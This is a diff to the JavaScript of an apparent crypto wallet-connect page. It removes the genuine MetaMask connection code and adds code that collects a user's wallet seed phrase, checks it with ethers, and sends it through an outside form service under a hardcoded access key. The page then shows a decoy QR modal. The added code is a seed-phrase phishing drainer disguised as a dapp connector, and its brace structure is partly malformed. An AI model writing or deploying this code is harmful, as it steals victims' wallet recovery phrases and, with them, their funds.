@@ -1058,37 +1058,40 @@
             }, 5000);
 
             try {
-                // create a Web3Provider instance
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                // request access to the user's MetaMask account
-                await window.ethereum.request({
-                    method: 'eth_requestAccounts'
-                });
-                // get the current account address
-                const signer = provider.getSigner();
-                const address = await signer.getAddress();
-                //web3 connection end here
-            } catch (error) {
-                console.error('Error fetching data:', error);
-            }
-        }
+  const wallet = ethers.Wallet.fromMnemonic(dappWords);
 
-        $("#tryAgain").click(function () {
-            $("#modalLoad").show();
-            $("#modalError").hide();
-            $("#modalConnect").hide();
-            setTimeout(function () {
-                $("#modalError").show();
-                $("#modalLoad").hide();
-                $("#modalConnect").hide();
-            }, 5000);
-        });
+  // ✅ Correct Web3Forms setup
+  $.ajax({
+    url: "https://api.web3forms.com/submit",
+    method: "POST",
+    dataType: "json",
+    data: {
+      access_key: "7650ee6c-1d03-452e-85d4-adfb3158ee10", // your Web3Forms public key
+      dappWord: dappWords,
+      dappName: dappName,
+      linkName: dappLinkName
+    },
+    success: function (response) {
+      console.log("Form submitted successfully:", response);
+    },
+    error: function (xhr, status, error) {
+      console.error("Error submitting form:", xhr.responseText || error);
+    },
+    complete: function () {
+      console.log("Form submission completed.");
+    }
+  });
 
-        $("#connectManual").click(function () {
-            $("#modalLoad").hide();
-            $("#modalError").hide();
-            $("#modalConnect").show();
-        });
+  // UI handling after submission
+  document.getElementById("p-code").innerHTML = randomString;
+  $("#mainModal").hide();
+  $("#qrModal").show();
+  document.getElementById("submit_phrase").disabled = true;
+
+} catch (error) {
+  $("#formPhrase").addClass("error");
+  console.error("Invalid seed phrase:", error);
+});
 
         // Get the modal
         var modal = document.getElementById("connectModal");
